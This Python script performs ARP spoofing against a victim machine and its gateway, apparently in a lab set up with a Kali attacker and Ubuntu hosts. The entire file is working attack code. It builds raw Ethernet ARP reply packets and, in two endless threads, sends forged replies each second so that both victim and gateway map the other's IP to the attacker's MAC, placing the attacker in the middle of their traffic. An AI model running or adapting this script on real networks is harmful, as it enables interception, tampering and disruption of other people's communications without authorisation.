# -*- coding: UTF-8 -*-
import sys
import socket
import struct
import time
import threading


def arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip):
    #Ethernet header
    des_eth_mac=des_mac #Ethernet destination address   
    src_eth_mac=src_mac #Ethernet source address
    frame_type=b'\x08\x06' #Address Resolution Protocol; b'\x08\x06' == (ARP)

    #ARP packet header
    hardware_type=b'\x00\x01' #Hardware Type (HTYPE) == Ethernet
    pro_type=b'\x08\x00' #PTYPE (Protocol Type) == IPv4
    hardware_len=b'\x06' #HLEN (Hardware Length) == 6(Ethernet)
    pro_len=b'\x04' #PLEN (Protocol Length) == 4(IPv4)
    
    #op
    op=b'\x00\x02' #OPER (Operation) == 2(ARP Reply)
    
    
    sender_mac=src_eth_mac #Sender Ethernet address
    
    sender_ip=socket.inet_aton(src_ip) #Sender IP address
    
    target_mac=des_eth_mac #Receiver Ethernet address
    
    target_ip=socket.inet_aton(des_ip) #Receiver IP address

    return struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s",des_eth_mac,src_eth_mac,frame_type,hardware_type,pro_type,hardware_len,pro_len,op,sender_mac,sender_ip,target_mac,target_ip)



def send_arp(src_mac,src_ip,des_mac,des_ip):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind(("eth0", 0))
    reply_packet=arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip)

    s.send(reply_packet)


def send_to_ubuntu(src_mac,fake_src_ip,des_mac,des_ip):

    print("send arp reply to Victim")

    while 1:
        send_arp(src_mac,fake_src_ip,des_mac,des_ip)
        time.sleep(1)

def send_to_gateway(src_mac,fake_src_ip,des_mac,des_ip):

    print("send arp reply to Gateway")

    while 1:
        send_arp(src_mac,fake_src_ip,des_mac,des_ip)
        time.sleep(1)

#Local MAC address        
src_mac=b'\x00\x0C\x29\x7F\x05\x7D'  #input("MAC address ATTACKER (ex 00:0C:29:7F:05:7D): ") # \x00\x0C\x29\x7F\x05\x7D (Kali Linux)

#Forged sender IP address
fake_src_gateway_ip='20.20.20.21' #destination IP address gateway == Ubuntu_DNMinh
fake_src_ubuntu_ip='20.20.20.24'


des_mac_u=b'\x00\x0C\x29\xEA\x26\x44'  #input("MAC address VICTIM (ex 00:0c:29:ea:26:44): ") # \x00\x0C\x29\xEA\x26\x44 (Ubuntu Victim)
# des_ip_u='20.20.20.24' #destination IP address = Ubuntu_Victim


des_mac_g=b'\x00\x0C\x29\x1E\xC1\x27'  #input("MAC address GATEWAY (ex 00:0C:29:1E:C1:27): ") # \xD8\xF2\xCA\xB5\x33\x4E (Ubuntu)
# des_ip_g='20.20.20.21' #destination IP address gateway == Ubuntu_DNMinh


# Start the thread sent to Ubuntu_Victim
# thread = threading.Thread(target=send_to_ubuntu, args=(src_mac,fake_src_gateway_ip,des_mac_u,des_ip_u))
thread = threading.Thread(target=send_to_ubuntu, args=(src_mac,fake_src_gateway_ip,des_mac_u,fake_src_ubuntu_ip))
thread.start()

time.sleep(0.1)

# Start sending to the gateway thread
# thread = threading.Thread(target=send_to_gateway, args=(src_mac,fake_src_ubuntu_ip,des_mac_g,des_ip_g))
thread = threading.Thread(target=send_to_gateway, args=(src_mac,fake_src_ubuntu_ip,des_mac_g,fake_src_gateway_ip))
thread.start()
